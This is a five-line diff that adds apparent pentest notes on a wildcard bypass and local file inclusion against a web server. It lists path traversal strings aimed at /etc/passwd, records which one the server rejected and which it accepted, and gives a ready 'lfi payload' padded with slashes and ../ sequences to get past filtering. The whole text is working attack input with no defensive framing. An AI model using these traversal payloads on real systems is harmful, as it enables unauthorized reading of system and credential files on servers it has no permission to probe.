@@ -1,0 +1,5 @@
+wildcard  bypass & lfi
+"/user/local/../../etc/passwd" ->bad request
+"/user/local/redacted/../../../etc/passwd" -> ok
+
+lfi payload: //////////////////../../../../../../../../etc/passwd
